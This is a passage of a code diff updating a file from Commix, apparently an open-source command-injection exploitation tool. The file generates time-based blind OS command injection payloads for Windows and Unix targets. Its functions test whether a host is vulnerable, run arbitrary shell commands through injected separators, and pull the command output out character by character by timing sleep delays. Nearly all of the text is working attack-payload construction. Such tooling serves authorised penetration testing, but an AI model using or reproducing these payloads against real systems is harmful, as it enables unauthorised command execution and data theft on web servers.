@@ -3,13 +3,13 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -25,71 +25,59 @@ The available "time-based" payloads.
 Time-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator + 
-                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
-                 "do if %i==" +str(output_length) + " "
-                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe +
+                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
+                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  
-                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
-                 "do if %i==" +str(output_length) + " "
-                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+      payload = (ampersand +
+                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
+                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
   else:
-    if separator == ";" :
-      payload = (separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
+                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
-                 # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator +  
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
-                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0 " + separator + 
-                 "str=$(echo " + TAG + ")" + separator + 
+      payload = (ampersand +
+                 "sleep 0 " + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
-                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
-      #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(output_length) + " != $(echo " + TAG + " " + 
-                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
+                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.SINGLE_WHITESPACE +
+                 pipe + "tr -d '\\n' " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                  "sleep " + str(timesec)
-                 )  
+                 )
     else:
       pass
 
@@ -99,69 +87,57 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print len(\'" + TAG + "\')\""
-    if separator == "||" :
-      payload = (separator +  " " 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" +str(output_length) + " "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" +str(output_length) + " "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
-  else:  
-    if separator == ";" :
-      payload = (separator + 
+  else:
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
                  # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
-                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
+                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
-                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + " "
-                 "$(python -c \"import time\ntime.sleep(0)\") " + separator + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
-                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      #if menu.options.data:
+      
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
                  # Find the length of the output, using readline().
-                 "[ " + str(output_length) + " != $(python -c \"print len(\'" + TAG + "\')\") ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
-                 ) 
+                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                 )
     else:
       pass
 
@@ -171,6 +147,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
+    else:
+      if settings.TARGET_OS != settings.OS.WINDOWS:
+        payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -178,70 +157,62 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" +str(output_length) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                cmd +
+                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" +str(output_length) + " "
-                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                cmd +
+                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-  else: 
-    if separator == ";" :
-      payload = (separator + 
-                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
-                 #"str1=${%23str}" + separator + 
-                 "str1=$(expr length \"$str\")" + separator +
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
+  else:
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = cmd
+    if settings.USE_BACKTICKS:
+      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
+                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
+                 "fi"
                 )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
-                 # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
-                 )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0" + separator + 
-                 "str=$(echo $(" + cmd + "))" + separator +
+      payload = (ampersand +
+                 "sleep 0" + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=$(expr length $str)" + separator +
-                 #"str1=${%23str}  " + separator + 
-                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length $" + settings.RANDOM_VAR_GENERATOR + ")" + separator +
+                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
-      #if menu.options.data:
+      
       separator = _urllib.parse.unquote(separator)
-        
+
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " +str(output_length)+ " != $(echo -n \"$(" + cmd + ")\" " + 
-                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
+                 "[ " +str(output_length)+ " -ne " + settings.CMD_SUB_PREFIX + "echo -n \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" +
+                 pipe + "tr -d '\\n'  " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                  "sleep " + str(timesec)
                  )
     else:
@@ -253,67 +224,57 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
-                cmd + 
-                "') do if %i==" +str(output_length) + " " +
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
+                cmd +
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+      
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
-                cmd + 
-                "') do if %i==" +str(output_length) + " " +
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
+                cmd +
+                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
-  else: 
-    if separator == ";" :
-      payload = (separator + 
+  else:
+    settings.USER_APPLIED_CMD = cmd
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
                  # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
-                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
+                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
-                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " + separator + 
+      payload = (ampersand +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                  # Find the length of the output, using readline().
-                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
-                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
+                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                  )
-      #if menu.options.data:
+      
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
                  # Find the length of the output, using readline().
-                 "[ " + str(output_length) + " != $(python -c \"print len(\'$(echo $(" + cmd + "))\')\") ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
-                 ) 
+                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\") ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                 )
     else:
       pass
 
@@ -323,87 +284,78 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
-
+    else:
+      if settings.TARGET_OS != settings.OS.WINDOWS:
+        payload = payload.replace("\n","%0d")
   return payload
 """
 Get the execution output, of shell execution.
 """
 def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator +  " " +
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
-                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
+      payload = (ampersand +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
+                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-  else: 
-    if separator == ";" :
-      payload = (separator + 
+  else:
+    cmd_exec = cmd
+    if settings.USE_BACKTICKS:
+      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    settings.USER_APPLIED_CMD = cmd
+    if separator == ";" or separator == "%0a" :
+      payload = (separator +
                 # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator +       
+                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
+                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
                 # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " != $str ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
-                "fi "
+                "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
+                # "then sleep 0" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
                 )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator +     
-                # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
-                # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
-                # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " != $str ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
-                "fi "
-                )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                "sleep 0 " + separator + 
+      payload = (ampersand +
+                "sleep 0 " + separator +
                 # Grab the execution output.
-                "cmd=\"$(echo $(" + cmd + "))\"" + separator + 
+                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 # Export char-by-char the execution output.
-                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
+                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
                 # Transform from Ascii to Decimal.
-                "str=$(printf %25d \"'$char'\")" + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Perform the time-based comparisons
